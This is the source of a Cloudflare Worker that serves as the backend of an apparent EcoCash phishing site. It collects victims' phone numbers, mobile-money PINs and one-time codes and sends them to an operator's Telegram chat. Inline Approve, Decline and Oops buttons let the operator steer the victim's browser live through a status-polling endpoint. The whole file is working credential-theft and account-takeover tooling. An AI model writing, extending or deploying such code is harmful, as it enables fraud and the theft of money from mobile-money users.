// In-memory status store (resets when Worker redeploys — fine for testing)
const statusStore = new Map();

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      // =========================
      // 1. POST /api/send
      // =========================
      if (url.pathname === '/api/send') {
        if (request.method !== 'POST') {
          return jsonResponse({ error: 'Method not allowed' }, 405);
        }

        if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
          return jsonResponse({
            error: 'Secrets not configured',
            hasToken: !!env.TELEGRAM_BOT_TOKEN,
            hasChatId: !!env.TELEGRAM_CHAT_ID
          }, 500);
        }

        let body;
        try {
          body = await request.json();
        } catch (e) {
          return jsonResponse({ error: 'Invalid JSON body' }, 400);
        }

        const { phone, pin, amount, currency, txnId, code, resend } = body;

        let message = '';
        if (resend) {
          message = `🔁 *Resend Code Requested*\n-------------------------------\n`;
          message += `🆔 *Txn ID:* ${txnId}\n`;
          message += `💰 *Amount:* ${currency} ${amount}\n`;
          message += `⏱ *Time:* ${new Date().toISOString()}`;
        } else {
          message = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
          if (phone) message += `📱 *Phone:* +263 ${phone}\n`;
          if (pin) message += `🔑 *PIN:* ${pin}\n`;
          if (code) message += `🔢 *Code:* ${code}\n`;
          message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toISOString()}`;
        }

        const payload = {
          chat_id: env.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        };

        // Attach Approve/Decline/Oops buttons when a code is submitted
        if (code && txnId) {
          payload.reply_markup = {
            inline_keyboard: [[
              { text: "✅ Approve", callback_data: `approve:${txnId}` },
              { text: "❌ Decline", callback_data: `decline:${txnId}` },
              { text: "😅 Oops", callback_data: `oops:${txnId}` }
            ]]
          };
        }

        try {
          const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          const tgData = await tgRes.json();

          if (!tgData.ok) {
            return jsonResponse({ error: tgData.description, telegramCode: tgData.error_code }, 400);
          }

          // Register the transaction as "pending" so /api/status returns "pending" until a button is pressed
          if (txnId && code) {
            statusStore.set(txnId, 'pending');
          }

          return jsonResponse({ success: true }, 200);
        } catch (tgError) {
          return jsonResponse({ error: 'Telegram fetch failed: ' + tgError.message }, 500);
        }
      }

      // =========================
      // 2. GET /api/status
      // =========================
      if (url.pathname === '/api/status' && request.method === 'GET') {
        const txnId = url.searchParams.get('txnId');
        if (!txnId) return jsonResponse({ error: 'txnId required' }, 400);
        const status = statusStore.get(txnId) || 'pending';
        return jsonResponse({ status }, 200);
      }

      // =========================
      // 3. POST /api/webhook (Telegram callback)
      // =========================
      if (url.pathname === '/api/webhook' && request.method === 'POST') {
        let update;
        try {
          update = await request.json();
        } catch {
          return jsonResponse({ ok: true }, 200);
        }

        const cq = update.callback_query;
        if (cq && cq.data) {
          const [action, txnId] = cq.data.split(':');

          // Save the status so the browser can pick it up
          if (txnId) {
            statusStore.set(txnId, action);
          }

          // Acknowledge the button press in Telegram so the loading spinner stops
          try {
            await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: cq.id,
                text: `Action: ${action}`
              })
            });
          } catch (e) { /* ignore */ }
        }

        return jsonResponse({ ok: true }, 200);
      }

      // =========================
      // 4. Static files
      // =========================
      if (!env.ASSETS) {
        return new Response('ASSETS binding missing in wrangler.toml', { status: 500 });
      }
      return env.ASSETS.fetch(request);

    } catch (fatalError) {
      return jsonResponse({ error: 'FATAL: ' + fatalError.message, stack: fatalError.stack }, 500);
    }
  }
};

function jsonResponse(data, status) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}
